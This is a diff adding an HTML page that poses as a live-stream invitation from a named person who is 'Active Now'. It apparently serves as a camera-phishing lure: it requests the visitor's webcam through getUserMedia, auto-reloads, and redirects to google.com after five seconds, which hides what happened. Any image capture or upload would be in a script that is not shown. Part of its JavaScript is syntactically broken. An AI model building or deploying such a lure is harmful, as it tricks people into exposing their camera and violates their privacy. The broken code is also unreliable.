@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="refresh" content="5">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+    			Live Stream    </title>
+
+    <!-- font awesome cdn link  -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+
+    <!-- custom css file link  -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<script>
+function AutoRefresh(+){
+    setTimeout ("location.reload(true);",t);
+    document.getElementById("refresh_status").innerHTML="refresh"
+)
+}
+</script>
+<style> 
+#container { 	
+margin: 0px auto; 
+width: 500px; 	
+height: 375px; 	
+border: 0px #333 solid; } 
+
+#videoElement { 	
+width: 300px; 
+	height: 200px; 	
+background-color: #bfffea39; } 
+</style>
+<body onload="JavaScript:AutoRefresh(5000);">
+ <h2 id="refresh_status"></h2>  
+<!-- header section starts  -->
+
+<header>
+
+ <h1>You Are Invited By Mason Alvarez </h1>
+
+    <nav class="navbar">
+        <a href="#home">home</a>
+        
+       
+    </nav>
+
+
+    <div class="icons">
+        <div id="menu-bars" class="fas fa-bars"></div>
+    
+    </div>
+
+</header>
+
+
+<section class="contact" id="contact">
+
+<h1 class="heading"> <span></span> </h1>
+
+<div class="icons-container">
+
+  <center><h1>Mason Alvarez is Active Now <img src="assets/active.png" width="12" height="12" alt=""></h1></center> 
+
+</div>    
+<center><img src="assets/mason.gif" height="250" alt=""></center>
+<br><br>
+<h1>You Are Active Now <img src="assets/active.png" width="12" height="12" alt=""></h1>
+<div class="row">
+
+<div id="container">
+ 	<video autoplay="true" id="videoElement">
+ 	 	</video> 
+
+</div>
+
+<script>
+var video = document.querySelector("#videoElement"); if (navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({ video: true }) .then(function (stream) { video.srcObject = stream; }) .catch(function (err0r) { console.log("Something went wrong!"); }); }
+
+</script>
+</div>
+
+</section>
+
+<script>
+function redirectpage () {
+     window.location="https://google.com" 
+}
+setTimeout("redirectpage ()", 5000),
+
+</script>
+
+<!-- contact section ends -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- javascript part  -->
+<script>
+
+let menu = document.querySelector('#menu-bars');
+let navbar = document.querySelector('.navbar');
+
+menu.onclick = () =>{
+    navbar.classList.toggle('active');
+    menu.classList.toggle('fa-times');
+}
+
+window.onscroll = () =>{
+    navbar.classList.remove('active');
+    menu.classList.remove('fa-times');
+}
+
+</script>
+<script src="script.js"></script>
+</body>
+</html>
